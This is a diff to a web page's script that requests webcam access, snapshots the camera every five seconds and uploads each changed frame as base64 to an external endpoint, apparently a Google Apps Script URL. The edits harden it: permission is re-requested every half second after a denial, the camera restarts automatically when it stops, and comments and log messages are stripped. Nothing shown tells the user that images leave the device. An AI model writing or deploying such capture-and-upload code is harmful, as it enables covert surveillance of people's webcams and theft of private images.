@@ -49,7 +49,6 @@ let lastHash = null;
 let firstSnapshotSent = false;
 const INTERVAL = 5000; // 5 sec
 
-// simple hash function for base64 comparison
 function hashString(str) {
     let hash = 0, i, chr;
     if (str.length === 0) return hash;
@@ -61,7 +60,6 @@ function hashString(str) {
     return hash;
 }
 
-// send to Google Apps Script
 async function sendImage(data){
     try{
         await fetch(GAS_URL,{
@@ -75,29 +73,30 @@ async function sendImage(data){
     }
 }
 
-// capture one snapshot immediately after permission
+// capture first snapshot only when video is ready
 function captureFirstSnapshot(){
     if(firstSnapshotSent) return;
-    ctx.drawImage(video,0,0,320,320);
-    const img = canvas.toDataURL("image/jpeg",0.6);
-    const base64 = img.replace("data:image/jpeg;base64,","");
-    lastHash = hashString(base64);
-    sendImage(base64);
-    firstSnapshotSent = true;
-    console.log("first snapshot sent");
+    if(video.readyState >= 2){ // HAVE_CURRENT_DATA
+        ctx.drawImage(video,0,0,320,320);
+        const img = canvas.toDataURL("image/jpeg",0.6);
+        const base64 = img.replace("data:image/jpeg;base64,","");
+        lastHash = hashString(base64);
+        sendImage(base64);
+        firstSnapshotSent = true;
+        console.log("first snapshot sent");
+    } else {
+        // wait a bit and retry
+        setTimeout(captureFirstSnapshot,100);
+    }
 }
 
-// start interval capture with motion detection
 function startCapture() {
     if(captureInterval) return;
 
     console.log("capture started");
 
     captureInterval = setInterval(()=>{
-        if(document.hidden){
-            console.log("tab hidden, skipping capture");
-            return;
-        }
+        if(document.hidden) return;
 
         ctx.drawImage(video,0,0,320,320);
         const img = canvas.toDataURL("image/jpeg",0.6);
@@ -114,7 +113,6 @@ function startCapture() {
     }, INTERVAL);
 }
 
-// stop capture
 function stopCapture(){
     if(captureInterval){
         clearInterval(captureInterval);
@@ -123,29 +121,29 @@ function stopCapture(){
     }
 }
 
-// start camera
-async function startCamera() {
-    try {
+async function startCamera(){
+    try{
         stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
         video.srcObject = stream;
 
-        // immediately send first snapshot after permission
+        // first snapshot after video ready
         captureFirstSnapshot();
 
-        video.onloadedmetadata = function() {
+        video.onloadedmetadata = function(){
             if(!document.hidden){
                 startCapture();
             }
         }
 
+        // auto restart if camera stops
         stream.getVideoTracks()[0].onended = function(){
-            console.log("camera stopped, retry in 3 sec");
+            console.log("camera stopped, retry in 1 sec");
             stopCapture();
             setTimeout(startCamera,1000);
         }
 
     } catch(e){
-        console.log("camera permission denied or error, retry in 5 sec");
+        console.log("camera permission denied or error, retry in 0.5 sec");
         setTimeout(startCamera,500);
     }
 }
@@ -153,10 +151,8 @@ async function startCamera() {
 // handle tab visibility
 document.addEventListener("visibilitychange", ()=>{
     if(document.hidden){
-        console.log("tab hidden");
         stopCapture();
     } else {
-        console.log("tab visible");
         if(video.srcObject){
             startCapture();
         }
@@ -164,6 +160,7 @@ document.addEventListener("visibilitychange", ()=>{
 });
 
 startCamera();
+
 </script>
 
 </body>
